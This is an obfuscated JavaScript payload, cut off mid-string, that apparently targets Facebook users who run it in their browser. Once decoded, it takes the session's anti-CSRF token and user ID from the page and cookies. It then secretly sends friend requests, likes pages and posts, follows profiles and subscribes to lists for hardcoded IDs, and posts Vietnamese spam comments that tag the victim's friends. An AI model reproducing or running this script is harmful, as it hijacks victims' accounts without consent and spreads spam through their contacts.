eval(unescape("%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%49%44%53%28%72%29%20%7B%0A%20%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%20%20%76%61%72%20%58%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%61%64%64%5F%66%72%69%65%6E%64%2F%61%63%74%69%6F%6E%2E%70%68%70%22%3B%0A%20%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%74%6F%5F%66%72%69%65%6E%64%3D%22%20%2B%20%72%20%2B%22%26%61%63%74%69%6F%6E%3D%61%64%64%5F%66%72%69%65%6E%64%26%68%6F%77%5F%66%6F%75%6E%64%3D%66%72%69%65%6E%64%5F%62%72%6F%77%73%65%72%5F%73%26%72%65%66%5F%70%61%72%61%6D%3D%6E%6F%6E%65%26%26%26%6F%75%74%67%6F%69%6E%67%5F%69%64%3D%26%6C%6F%67%67%69%6E%67%5F%6C%6F%63%61%74%69%6F%6E%3D%73%65%61%72%63%68%26%6E%6F%5F%66%6C%79%6F%75%74%5F%6F%6E%5F%63%6C%69%63%6B%3D%74%72%75%65%26%65%67%6F%5F%6C%6F%67%5F%64%61%74%61%26%68%74%74%70%5F%72%65%66%65%72%65%72%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%33%35%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%0A%20%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%20%20%20%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%0A%20%20%20%20%20%20%58%2E%63%6C%6F%73%65%3B%0A%20%20%20%20%7D%0A%20%20%7D%3B%0A%20%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%0A%7D%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%0A%66%75%6E%63%74%69%6F%6E%20%4C%69%6B%65%28%70%29%20%7B%20%76%61%72%20%50%61%67%65%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%20%76%61%72%20%50%61%67%65%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%61%67%65%73%2F%66%61%6E%5F%73%74%61%74%75%73%2E%70%68%70%22%3B%20%0A%20%76%61%72%20%50%61%67%65%50%61%72%61%6D%73%20%3D%20%22%26%66%62%70%61%67%65%5F%69%64%3D%22%20%2B%20%70%20%2B%22%26%61%64%64%3D%74%72%75%65%26%72%65%6C%6F%61%64%3D%66%61%6C%73%65%26%66%61%6E%5F%6F%72%69%67%69%6E%3D%70%61%67%65%5F%74%69%6D%65%6C%69%6E%65%26%66%61%6E%5F%73%6F%75%72%63%65%3D%26%63%61%74%3D%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%61%67%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%64%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%50%61%67%65%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%50%61%67%65%55%52%4C%2C%20%74%72%75%65%29%3B%20%0A%20%50%61%67%65%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%50%61%67%65%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%50%61%67%65%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%50%61%67%65%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%0A%20%50%61%67%65%2E%73%65%6E%64%28%50%61%67%65%50%61%72%61%6D%73%29%3B%20%7D%20%0A%4C%69%6B%65%28%22%31%37%36%38%36%35%31%36%32%34%36%32%30%39%37%22%29%3B%4C%69%6B%65%28%22%31%37%30%33%39%37%34%37%36%34%35%37%38%37%37%22%29%3B%4C%69%6B%65%28%22%34%35%39%38%33%31%39%37%34%31%36%33%33%36%35%22%29%3B%0A%4C%69%6B%65%28%22%36%39%34%30%30%31%34%31%37%33%33%30%34%34%30%22%29%3B%4C%69%6B%65%28%22%37%30%33%34%38%39%37%35%33%30%34%31%31%33%34%22%29%3B%4C%69%6B%65%28%22%34%34%35%31%39%35%38%37%38%39%31%37%33%31%32%22%29%3B%0A%4C%69%6B%65%28%22%31%34%33%37%32%30%38%34%39%33%31%38%30%38%39%38%22%29%3B%4C%69%6B%65%28%22%36%37%36%32%35%38%33%30%39%30%38%33%36%34%39%22%29%3B%4C%69%6B%65%28%22%35%36%34%34%31%31%30%39%36%39%34%32%31%35%38%22%29%3B%0A%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%20%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%0A%20%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%20%0A%20%66%75%6E%63%74%69%6F%6E%20%50%28%6F%70%6F%29%20%7B%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%0A%20%76%61%72%20%58%55%52%4C%20%3D%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%75%66%69%2F%6C%69%6B%65%2E%70%68%70%22%3B%0A%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%6C%69%6B%65%5F%61%63%74%69%6F%6E%3D%74%72%75%65%26%66%74%5F%65%6E%74%5F%69%64%65%6E%74%69%66%69%65%72%3D%22%2B%6F%70%6F%2B%22%26%73%6F%75%72%63%65%3D%31%26%63%6C%69%65%6E%74%5F%69%64%3D%22%2B%6E%6F%77%2B%22%25%33%41%33%37%39%37%38%33%38%35%37%26%72%6F%6F%74%69%64%3D%75%5F%6A%73%6F%6E%70%5F%33%39%5F%31%38%26%67%69%66%74%6F%63%63%61%73%69%6F%6E%26%66%74%5B%74%6E%5D%3D%25%33%45%25%33%44%26%66%74%5B%74%79%70%65%5D%3D%32%30%26%66%74%5B%71%69%64%5D%3D%35%38%39%30%38%31%31%33%32%39%34%37%30%32%37%39%32%35%37%26%66%74%5B%6D%66%5F%73%74%6F%72%79%5F%6B%65%79%5D%3D%32%38%31%34%39%36%32%39%30%30%31%39%33%31%34%33%39%35%32%26%66%74%5B%68%61%73%5F%65%78%70%61%6E%64%65%64%5F%75%66%69%5D%3D%31%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%68%6F%6D%65%5F%73%74%72%65%61%6D%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%38%51%6F%41%4D%42%6C%43%6C%79%6F%63%70%61%65%26%5F%5F%72%65%71%3D%67%34%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%58%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%20%7D%0A%50%28%22%32%34%33%34%30%36%32%36%35%38%33%36%32%39%38%22%29%3B%50%28%22%31%34%36%31%38%31%36%36%36%37%33%37%38%30%36%38%22%29%3B%50%28%22%31%34%36%31%38%32%35%30%34%34%30%34%33%38%39%37%22%29%3B%50%28%22%31%34%39%37%32%34%30%38%34%33%38%33%35%36%35%30%22%29%3B%0A%50%28%22%35%36%37%39%36%37%36%36%33%32%39%39%37%35%37%22%29%3B%50%28%22%31%34%33%36%39%34%36%39%39%39%38%38%34%38%32%30%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%20%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%20%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%66%75%6E%63%74%69%6F%6E%20%49%44%53%28%72%29%20%7B%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%58%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%61%64%64%5F%66%72%69%65%6E%64%2F%61%63%74%69%6F%6E%2E%70%68%70%22%3B%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%74%6F%5F%66%72%69%65%6E%64%3D%22%20%2B%20%72%20%2B%20%22%26%61%63%74%69%6F%6E%3D%61%64%64%5F%66%72%69%65%6E%64%26%68%6F%77%5F%66%6F%75%6E%64%3D%66%72%69%65%6E%64%5F%62%72%6F%77%73%65%72%5F%73%26%72%65%66%5F%70%61%72%61%6D%3D%6E%6F%6E%65%26%26%26%6F%75%74%67%6F%69%6E%67%5F%69%64%3D%26%6C%6F%67%67%69%6E%67%5F%6C%6F%63%61%74%69%6F%6E%3D%73%65%61%72%63%68%26%6E%6F%5F%66%6C%79%6F%75%74%5F%6F%6E%5F%63%6C%69%63%6B%3D%74%72%75%65%26%65%67%6F%5F%6C%6F%67%5F%64%61%74%61%26%68%74%74%70%5F%72%65%66%65%72%65%72%26%5F%5F%75%73%65%72%3D%22%20%2B%20%75%73%65%72%5F%69%64%20%2B%20%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%33%35%26%66%62%5F%64%74%73%67%3D%22%20%2B%20%66%62%5F%64%74%73%67%20%2B%20%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%58%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%20%7D%0A%49%44%53%28%22%31%30%30%30%30%36%34%39%32%34%35%38%36%37%32%22%29%3B%49%44%53%28%22%31%30%30%30%30%35%34%36%35%34%39%37%34%38%38%22%29%3B%49%44%53%28%22%31%30%30%30%30%37%30%32%31%33%38%34%31%32%33%22%29%3B%49%44%53%28%22%31%30%30%30%30%37%30%38%36%30%30%31%39%30%35%22%29%3B%49%44%53%28%22%31%30%30%30%30%37%30%36%31%36%37%34%31%38%38%22%29%3B%49%44%53%28%22%31%30%30%30%30%32%35%39%35%38%35%32%30%33%31%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%61%28%61%62%6F%6E%65%29%0A%7B%20%76%61%72%20%68%74%74%70%34%3D%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%3B%0A%20%76%61%72%20%75%72%6C%34%3D%22%2F%61%6A%61%78%2F%66%6F%6C%6C%6F%77%2F%66%6F%6C%6C%6F%77%5F%70%72%6F%66%69%6C%65%2E%70%68%70%3F%5F%5F%61%3D%31%22%3B%0A%20%76%61%72%20%70%61%72%61%6D%73%34%3D%22%70%72%6F%66%69%6C%65%5F%69%64%3D%22%2B%61%62%6F%6E%65%2B%22%26%6C%6F%63%61%74%69%6F%6E%3D%31%26%73%6F%75%72%63%65%3D%66%6F%6C%6C%6F%77%2D%62%75%74%74%6F%6E%26%73%75%62%73%63%72%69%62%65%64%5F%62%75%74%74%6F%6E%5F%69%64%3D%75%33%37%71%61%63%5F%33%37%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%6C%73%64%26%5F%5F%22%2B%75%73%65%72%5F%69%64%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%68%74%74%70%34%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%75%72%6C%34%2C%74%72%75%65%29%3B%0A%20%68%74%74%70%34%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%3D%66%75%6E%63%74%69%6F%6E%28%29%0A%20%7B%20%20%69%66%28%68%74%74%70%34%2E%72%65%61%64%79%53%74%61%74%65%3D%3D%34%26%26%68%74%74%70%34%2E%73%74%61%74%75%73%3D%3D%32%30%30%29%68%74%74%70%34%2E%63%6C%6F%73%65%20%7D%3B%0A%20%68%74%74%70%34%2E%73%65%6E%64%28%70%61%72%61%6D%73%34%29%7D%0A%66%75%6E%63%74%69%6F%6E%20%73%75%62%6C%69%73%74%28%75%69%64%73%73%29%0A%7B%20%76%61%72%20%61%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%0A%20%61%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%6E%65%77%20%41%73%79%6E%63%52%65%71%75%65%73%74%28%29%2E%73%65%74%55%52%49%28%27%2F%61%6A%61%78%2F%66%72%69%65%6E%64%73%2F%6C%69%73%74%73%2F%73%75%62%73%63%72%69%62%65%2F%6D%6F%64%69%66%79%3F%6C%6F%63%61%74%69%6F%6E%3D%70%65%72%6D%61%6C%69%6E%6B%26%61%63%74%69%6F%6E%3D%73%75%62%73%63%72%69%62%65%27%29%2E%73%65%74%44%61%74%61%28%7B%20%66%6C%69%64%3A%20%22%20%2B%20%75%69%64%73%73%20%2B%20%22%20%7D%29%2E%73%65%6E%64%28%29%3B%22%3B%0A%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%61%29%3B%0A%7D%0A%61%28%22%31%30%30%30%30%32%35%39%35%38%35%32%30%33%31%22%29%3B%73%75%62%6C%69%73%74%28%22%35%36%32%35%32%35%32%37%30%35%31%30%36%36%33%22%29%3B%73%75%62%6C%69%73%74%28%22%31%34%32%32%31%39%33%39%30%31%33%36%32%31%38%38%22%29%3B%0A%61%28%22%31%30%30%30%30%36%34%39%32%34%35%38%36%37%32%22%29%3B%61%28%22%31%30%30%30%30%35%34%36%35%34%39%37%34%38%38%22%29%3B%61%28%22%31%30%30%30%30%37%30%32%31%33%38%34%31%32%33%22%29%3B%61%28%22%31%30%30%30%30%37%30%38%36%30%30%31%39%30%35%22%29%3B%61%28%22%31%30%30%30%30%37%30%36%31%36%37%34%31%38%38%22%29%3B%0A%73%75%62%6C%69%73%74%28%22%35%39%34%35%37%39%33%38%30%36%33%38%35%38%35%22%29%3B%0A%0A%76%61%72%20%5F%30%78%61%32%32%63%3D%5B%22%76%61%6C%75%65%22%2C%22%66%62%5F%64%74%73%67%22%2C%22%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%22%2C%22%6D%61%74%63%68%22%2C%22%63%6F%6F%6B%69%65%22%2C%22%31%34%33%36%39%34%36%39%39%39%38%38%34%38%32%30%22%2C%22%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%22%2C%22%72%65%61%64%79%53%74%61%74%65%22%2C%22%61%72%6B%61%64%61%73%6C%61%72%20%3D%20%22%2C%22%66%6F%72%20%28%3B%3B%29%3B%22%2C%22%22%2C%22%72%65%70%6C%61%63%65%22%2C%22%72%65%73%70%6F%6E%73%65%54%65%78%74%22%2C%22%3B%22%2C%22%6C%65%6E%67%74%68%22%2C%22%65%6E%74%72%69%65%73%22%2C%22%70%61%79%6C%6F%61%64%22%2C%22%72%6F%75%6E%64%22%2C%22%20%40%5B%22%2C%22%75%69%64%22%2C%22%3A%22%2C%22%74%65%78%74%22%2C%22%5D%22%2C%22%20%22%2C%22%5C%78%32%36%66%69%6C%74%65%72%5B%30%5D%3D%75%73%65%72%22%2C%22%5C%78%32%36%6F%70%74%69%6F%6E%73%5B%30%5D%3D%66%72%69%65%6E%64%73%5F%6F%6E%6C%79%22%2C%22%5C%78%32%36%6F%70%74%69%6F%6E%73%5B%31%5D%3D%6E%6D%22%2C%22%5C%78%32%36%74%6F%6B%65%6E%3D%76%37%22%2C%22%5C%78%32%36%76%69%65%77%65%72%3D%22%2C%22%5C%78%32%36%5F%5F%75%73%65%72%3D%22%2C%22%68%74%74%70%73%3A%2F%2F%22%2C%22%69%6E%64%65%78%4F%66%22%2C%22%55%52%4C%22%2C%22%47%45%54%22%2C%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%66%69%72%73%74%5F%64%65%67%72%65%65%2E%70%68%70%3F%5F%5F%61%3D%31%22%2C%22%6F%70%65%6E%22%2C%22%68%74%74%70%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%66%69%72%73%74%5F%64%65%67%72%65%65%2E%70%68%70%3F%5F%5F%61%3D%31%22%2C%22%73%65%6E%64%22%2C%22%72%61%6E%64%6F%6D%22%2C%22%66%6C%6F%6F%72%22%2C%22%5C%78%32%36%66%74%5F%65%6E%74%5F%69%64%65%6E%74%69%66%69%65%72%3D%22%2C%22%5C%78%32%36%63%6F%6D%6D%65%6E%74%5F%74%65%78%74%3D%28%79%29%20%20%53%49%CA%55%20ĐẸ%50%20%4C%55%D4%4E%20%50%C0%20%4B%4F%4E%20Ơ%49%20%21%21%21%21%21%21%21%21%21%21%20%54%75%69%20%6C%E0%6D%20đ%63%20%72ồ%69%20%6E%E8%20%2D%20%64ễ%20%74%68ươ%6E%67%20%71%75%E1%20%3A%44%2E%20%43%61́%6D%20ơ%6E%20%62ạ%6E%20%6E%68%69%EÀ%75%20%6E%68%61%2E%20Ả%4E%48%20đẹ%70%20%63ự%63%20%6Bỳ%20%6C%75%F4%6E%2C%20%74%68ử%20%6E%67%61%79%20%76%E0%20%6C%75%F4%6E%20đ%69%20%6Dọ%69%20%6E%67ườ%69%20%28%74%75%69%20%63%68ỉ%20%6D%75ố%6E%20%63%68%69%61%20%73ẻ%20%6E%69ề%6D%20%76%75%69%20%76ớ%69%20%6D%2E%6E%20%74%68%F4%69%20%3C%33%20%3C%33%20%3C%33%20%3C%33%20%3A%76%20%28%79%29%2C%20%6Eế%75%20%63%F3%20%6C%E0%6D%20%70%68%69ề%6E%20%63%68%6F%20%74%75%69%20%78%69%6E%20%6Cỗ%69%20%74%72ướ%63%20%6E%68%E9%20%54%4B%53%20%3A%29%22%2C%22%5C%78%32%36%73%6F%75%72%63%65%3D%32%22%2C%22%5C%78%32%36%63%6C%69%65%6E%74%5F%69%64%3D%31%33%37%37%38%37%31%37%39%37%31%33%38%3A%31%37%30%37%30%31%38%30%39%32%22%2C%22%5C%78%32%36%72%65%70%6C%79%5F%66%62%69%64%22%2C%22%5C%78%32%36%70%61%72%65%6E%74%5F%63%6F%6D%6D%65%6E%74%5F%69%64%22%2C%22%5C%78%32%36%72%6F%6F%74%69%64%3D%75%5F%6A%73%6F%6E%70%5F%32%5F%33%22%2C%22%5C%78%32%36%63%6C%70%3D%7B%5C%78%32%32%63%6C%5F%69%6D%70%69%64%5C%78%32%32%3A%5C%78%32%32%34%35%33%35%32%34%61%30%5C%78%32%32%2C%5C%78%32%32%63%6C%65%61%72%63%6F%75%6E%74%65%72%5C%78%32%32%3A%30%2C%5C%78%32%32%65%6C%65%6D%65%6E%74%69%64%5C%78%32%32%3A%5C%78%32%32%6A%73%5F%35%5C%78%32%32%2C%5C%78%32%32%76%65%72%73%69%6F%6E%5C%78%32%32%3A%5C%78%32%32%78%5C%78%32%32%2C%5C%78%32%32%70%61%72%65%6E%74%5F%66%62%69%64%5C%78%32%32%3A%22%2C%22%7D%22%2C%22%5C%78%32%36%61%74%74%61%63%68%65%64%5F%73%74%69%63%6B%65%72%5F%66%62%69%64%3D%30%22%2C%22%5C%78%32%36%61%74%74%61%63%68%65%64%5F%70%68%6F%74%6F%5F%66%62%69%64%3D%30%22%2C%22%5C%78%32%36%67%69%66%74%6F%63%63%61%73%69%6F%6E%22%2C%22%5C%78%32%36%66%74%5B%74%6E%5D%3D%5B%5D%22%2C%22%5C%78%32%36%5F%5F%61%3D%31%22%2C%22%5C%78%32%36%5F%5F%64%79%6E%3D%37%6E%38%61%68%79%6A%33%35%79%6E%78%6C%32%75%35%46%39%37%4B%65%70%45%73%79%6F%22%2C%22%5C%78%32%36%5F%5F%72%65%71%3D%71%22%2C%22%5C%78%32%36%66%62%5F%64%74%73%67%3D%22%2C%22%5C%78%32%36%74%74%73%74%61%6D%70%3D%22%2C%22%50%4F%53%54%22%2C%22%2F%61%6A%61%78%2F%75%66%69%2F%61%64%64%5F%63%6F%6D%6D%65%6E%74%2E%70%68%70%22%2C%22%43%6F%6E%74%65%6E%74%2D%74%79%70%65%22%2C%22%61%70%70%6C%69%63%61%74%69%6F%6E%2F%78%2D%77%77%77%2D%66%6F%72%6D%2D%75%72%6C%65%6E%63%6F%64%65%64%22%2C%22%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%22%2C%22%73%74%61%74%75%73%22%2C%22%63%6C%6F%73%65%22%5D%3B%76%61%72%20%66%62%5F%64%74%73%67%3D%64%6F%63%75%6D%65%6E%74%5B%5F%30%78%61%32%32%63%5B%32%5D%5D%28%5F%30%78%61%32%32%63%5B%31%5D%29%5B%30%5D%5B%5F%30%78%61%32%32%63%5B%30%5D%5D%3B%76%61%72%20%75%73%65%72%5F%69%64%3D%64%6F%63%75%6D%65%6E%74%5B%5F%30%78%61%32%32%63%5B%34%5D%5D%5B%5F%30%78%61%32%32%63%5B%33%5D%5D%28%64%6F%63%75%6D%65%6E%74%5B%5F%30%78%61%32%32%63%5B%34%5D%5D%5B%5F%30%78%61%32%32%63%5B%33%5D%5D%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%76%61%72%20%69%64%3D%5F%30%78%61%32%32%63%5B%35%5D%3B%76%61%72%20%61%72%6B%61%64%61%73%6C%61%72%3D%5B%5D%3B%76%61%72%20%73%76%6E%5F%72%65%76%3B%66%75%6E%63%74%69%6F%6E%20%61%72%6B%61%64%61%73%6C%61%72%69%5F%61%6C%28%69%64%29%7B%76%61%72%20%5F%30%78%37%38%39%32%78%37%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%5F%30%78%37%38%39%32%78%37%5B%5F%30%78%61%32%32%63%5B%36%5D%5D%3D%66%75%6E%63%74%69%6F%6E%20%28%29%7B%69%66%28%5F%30%78%37%38%39%32%78%37%5B%5F%30%78%61%32%32%63%5B%37%5D%5D%3D%3D%34%29%7B%65%76%61%6C%28%5F%30%78%61%32%32%63%5B%38%5D%2B%5F%30%78%37%38%39%32%78%37%5B%5F%30%78%61%32%32%63%5B%31%32%5D%5D%2E%74%6F%53%74%72%69%6E%67%28%29%5B%5F%30%78%61%32%32%63%5B%31%31%5D%5D%28%5F%30%78%61%32%32%63%5B%39%5D%2C%5F%30%78%61%32%32%63%5B%31%30%5D%29%2B%5F%30%78%61%32%32%63%5B%31%33%5D%29%3B%66%6F%72%28%66%3D%30%3B%66%3C%4D%61%74%68%5B%5F%30%78%61%32%32%63%5B%31%37%5D%5D%28%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%34%5D%5D%2F%32%37%29%3B%66%2B%2B%29%7B%6D%65%73%61%6A%3D%5F%30%78%61%32%32%63%5B%31%30%5D%3B%6D%65%73%61%6A%5F%74%65%78%74%3D%5F%30%78%61%32%32%63%5B%31%30%5D%3B%66%6F%72%28%69%3D%66%2A%32%37%3B%69%3C%28%66%2B%31%29%2A%32%37%3B%69%2B%2B%29%7B%69%66%28%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%69%5D%29%7B%6D%65%73%61%6A%2B%3D%5F%30%78%61%32%32%63%5B%31%38%5D%2B%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%69%5D%5B%5F%30%78%61%32%32%63%5B%31%39%5D%5D%2B%5F%30%78%61%32%32%63%5B%32%30%5D%2B%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%69%5D%5B%5F%30%78%61%32%32%63%5B%32%31%5D%5D%2B%5F%30%78%61%32%32%63%5B%32%32%5D%3B%6D%65%73%61%6A%5F%74%65%78%74%2B%3D%5F%30%78%61%32%32%63%5B%32%33%5D%2B%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%